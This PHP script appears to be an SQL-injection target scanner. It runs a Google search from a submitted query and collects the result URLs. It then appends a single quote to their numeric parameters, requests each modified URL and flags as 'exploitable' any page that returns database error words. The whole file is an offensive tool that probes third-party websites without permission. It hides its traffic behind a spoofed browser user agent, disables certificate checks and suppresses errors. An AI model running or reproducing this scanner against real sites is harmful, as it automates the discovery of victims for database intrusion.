<?php
if (!function_exists("curl_init")) {
    exit("CURL REQUIRED");
}

if (!empty($_POST['query'])) {
    @set_time_limit(0);
    @error_reporting(0);
    @ignore_user_abort(true);
    ini_set('memory_limit', '128M');

    $query = trim($_POST['query']);
    $fetch = fetch($query . "&num=100");

    if (strpos($fetch, "We're sorry...") !== false) {
        print "GOOGLE ERROR";
        exit;
    }

    if (!preg_match_all("/a\s+href\s*=\s*[\"'](http[^\"']+)[\"']/i", $fetch, $matches)) {
        print "GOOGLE2 ERROR";
        exit;
    }

    foreach (array_unique($matches[1]) as $u) {
        if (strpos($u, "cache") !== false || strpos($u, "google") !== false ||
            strpos($u, "download.com") !== false || strpos($u, "youtube.com") !== false ||
            strpos($u, "javascript:void") !== false) {
            continue;
        }

        $offset = 0;
        $time = 0;

        while (preg_match("/=\d{1,}/", $u, $m, PREG_OFFSET_CAPTURE, $offset)) {
            if ($time > 3) {
                break;
            }

            $offset = $m[0][1] + strlen($m[0][0]);
            $_url = substr_replace($u, "'", $offset, 0);

            $decoded_content = strip_tags(html_entity_decode(fetch($_url)));

            if (preg_match_all("/\b(?:database|fetch|error|MySQL|mysql|SQL|query|Warning)\b/i", $decoded_content, $ws)) {
                print "<strong><font color=red>exploitable: $_url</font></strong><font color=blue>" . implode(",", $ws[0]) . "</font><br>";
                break;
            } else {
                echo $_url . "<br>";
                flush();
                ob_flush();
            }

            $time++;
        }

        if (!$time) {
            $u = $u . "'";
            $decoded_content = strip_tags(html_entity_decode(fetch($u)));

            if (preg_match_all("/\b(?:database|fetch|error|MySQL|mysql|SQL|query|Warning)\b/i", $decoded_content, $ws)) {
                print "<strong><font color=red>exploitable: $u</font></strong><font color=blue>" . implode(",", $ws[0]) . "</font><br>";
            } else {
                echo $u . "<br>";
                flush();
                ob_flush();
            }
        }
    }
}

function fetch($url) {
    if (file_exists('stopfile')) {
        exit;
    }

    $header[] = "Accept-Language: en";
    $header[] = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)";
    $header[] = "Connection: Keep-Alive";
    $header[] = "Pragma: no-cache";
    $header[] = "Cache-Control: no-cache";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    // Uncomment the line below to follow redirects
    // curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    if (!curl_setopt($ch, CURLOPT_TIMEOUT, 5)) {
        echo 'CURLOPT TIMEOUT Error';
    }
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    $page = curl_exec($ch);
    curl_close($ch);

    return $page;
}
?>
